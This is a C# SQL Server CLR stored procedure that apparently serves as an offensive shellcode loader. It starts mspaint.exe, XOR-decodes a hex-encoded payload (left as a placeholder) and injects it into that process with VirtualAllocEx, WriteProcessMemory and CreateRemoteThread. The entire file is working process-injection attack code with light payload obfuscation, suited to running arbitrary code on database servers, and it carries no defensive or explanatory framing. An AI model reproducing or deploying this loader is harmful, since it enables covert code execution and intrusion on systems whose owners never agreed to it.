using System;
using System.Data;
using System.Data.SqlClient;
using System.Data.SqlTypes;
using Microsoft.SqlServer.Server;
using System.Net;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;

public partial class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void runner ()
    {
        SqlPipe sqlPipeLine = SqlContext.Pipe;
        sqlPipeLine.Send(DateTime.UtcNow.ToString());


		Exec();
		
		
		
    }

	public static byte[] exclusiveOR(byte[] arr1, byte[] arr2)
	{
		

		byte[] result = new byte[arr1.Length];

		for (int i = 0; i < arr1.Length; ++i)
			result[i] = (byte)(arr1[i] ^ arr2[0]);

		return result;
	}

	public static string ByteArrayToString(byte[] ba)
	{
		StringBuilder hex = new StringBuilder(ba.Length * 2);
		foreach (byte b in ba)
			hex.AppendFormat("{0:x2}", b);
		return hex.ToString();
	}

	public static byte[] StringToByteArray(string hex)
	{
		if (hex.Length % 2 == 1)
			throw new Exception("The binary key cannot have an odd number of digits");

		byte[] arr = new byte[hex.Length >> 1];

		for (int i = 0; i < hex.Length >> 1; ++i)
		{
			arr[i] = (byte)((GetHexVal(hex[i << 1]) << 4) + (GetHexVal(hex[(i << 1) + 1])));
		}

		return arr;
	}
	public static int GetHexVal(char hex)
	{
		int val = (int)hex;
	
		return val - (val < 58 ? 48 : (val < 97 ? 55 : 87));
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	public static extern IntPtr GetModuleHandle(string lpModuleName);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

	[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
	static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

	[DllImport("kernel32.dll", SetLastError = true)]
	static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

	[DllImport("kernel32.dll")]
	static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

	public static void Exec()
	{

		var p = new Process();
		//Spawnto binary
		p.StartInfo.FileName = "mspaint.exe";

		p.Start();

		try
		{
			var procId = p.Id;
			Console.WriteLine("ID: " + procId);
		}
		catch(Exception e)
        {

        }


		Process targetProcess;

		try
		{
			targetProcess = Process.GetProcessById(p.Id);
		}
		catch
		{
			System.Console.WriteLine("Process not found!");
			return;
		}

		// Get process handler
		IntPtr process_handle = OpenProcess(0x1F0FFF, false, targetProcess.Id);

		
		string h = "[HEX]";
        byte[] k = new byte[] { 0xDE };
		byte[] shellcode = exclusiveOR(StringToByteArray(h), k);

		// Allocate a memory space in target process, big enough to store the shellcode
		IntPtr memory_allocation_variable = VirtualAllocEx(process_handle, IntPtr.Zero, (uint)(shellcode.Length), 0x00001000, 0x40);

		// Write the shellcode
		UIntPtr bytesWritten;
		WriteProcessMemory(process_handle, memory_allocation_variable, shellcode, (uint)(shellcode.Length), out bytesWritten);

		// Create a thread that will call LoadLibraryA with allocMemAddress as argument
		if (CreateRemoteThread(process_handle, IntPtr.Zero, 0, memory_allocation_variable, IntPtr.Zero, 0, IntPtr.Zero) != IntPtr.Zero)
		{
			Console.Write("done!");
		}
		else
		{
			Console.Write("failed!");
		}
	}

}